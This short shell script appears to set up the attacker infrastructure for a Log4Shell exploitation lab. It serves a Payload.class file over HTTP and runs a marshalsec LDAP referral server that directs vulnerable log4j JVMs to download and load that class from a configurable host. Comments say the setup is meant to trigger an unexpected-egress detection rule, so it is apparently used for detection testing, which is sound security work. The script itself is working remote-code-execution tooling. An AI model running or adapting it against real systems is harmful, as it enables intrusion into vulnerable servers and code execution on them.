#!/bin/sh
# HTTP server hosting Payload.class on :8888
cd /attacker/www && python3 -m http.server 8888 &
HTTP_PID=$!

# marshalsec LDAP referral server on :1389. Returns a CodebaseRef to the HTTP
# URL below, which the vulnerable log4j JVM dereferences and loads.
#
# The codebase host is configurable so the same image runs anywhere:
#   CODEBASE_URL   full override, e.g. http://my-host:8888/#Payload
#   CODEBASE_HOST  just the host   (default: the in-cluster attacker service)
# An external/public host is what makes the backend's egress non-private, so
# R0011 (unexpected egress) fires. Unset = identical to the previous behavior.
: "${CODEBASE_URL:=http://${CODEBASE_HOST:-attacker.attacker-ns.svc.cluster.local}:8888/#Payload}"
echo "[attacker] LDAP referral codebase = $CODEBASE_URL"
java -cp /attacker/marshalsec.jar marshalsec.jndi.LDAPRefServer "$CODEBASE_URL" 1389 &
LDAP_PID=$!

trap 'kill $HTTP_PID $LDAP_PID 2>/dev/null' INT TERM
wait
